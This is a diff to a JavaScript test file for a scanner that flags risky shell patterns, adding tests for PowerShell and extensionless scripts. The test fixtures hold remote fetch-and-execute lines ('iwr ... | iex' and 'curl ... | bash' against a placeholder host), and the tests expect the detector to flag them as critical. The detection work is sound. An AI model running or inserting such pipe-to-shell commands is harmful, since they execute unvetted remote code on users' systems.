@@ -18,9 +18,43 @@ test('shell: curl piped to bash is critical capability drift', () => {
   assert.equal(finding.surface, 'source');
 });
 
+test('shell: local PowerShell Invoke-Expression is not remote pipe-to-shell', () => {
+  const findings = detectShellCapability([
+    line('tools/run.ps1', 'Invoke-Expression $localScript')
+  ]);
+
+  assert.equal(findings.find((item) => item.kind === 'capability_echo.shell_pipe_to_shell'), undefined);
+});
+
+test('shell: PowerShell remote download into iex is critical capability drift', () => {
+  const findings = detectShellCapability([
+    line('tools/install.ps1', 'iwr https://install.example.com/bootstrap.ps1 | iex')
+  ]);
+
+  const finding = findings.find((item) => item.kind === 'capability_echo.shell_pipe_to_shell');
+  assert.ok(finding);
+  assert.equal(finding.severity, 'critical');
+});
+
 test('shell: script files are scannable source surfaces', () => {
   assert.equal(isScannable('scripts/bootstrap.sh'), true);
   assert.equal(isScannable('tools/install.ps1'), true);
+});
+
+test('shell: extensionless files with shell shebangs are scanned when contents are available', () => {
+  const findings = detectShellCapability(
+    [
+      line('scripts/bootstrap', 'curl https://install.example.com/agent.sh | bash', 2)
+    ],
+    {
+      'scripts/bootstrap': '#!/usr/bin/env bash\ncurl https://install.example.com/agent.sh | bash\n'
+    }
+  );
+
+  const finding = findings.find((item) => item.kind === 'capability_echo.shell_pipe_to_shell');
+  assert.ok(finding);
+  assert.equal(finding.file, 'scripts/bootstrap');
+  assert.equal(finding.line, 2);
 });
 
 test('shell: literal external download is medium capability drift', () => {
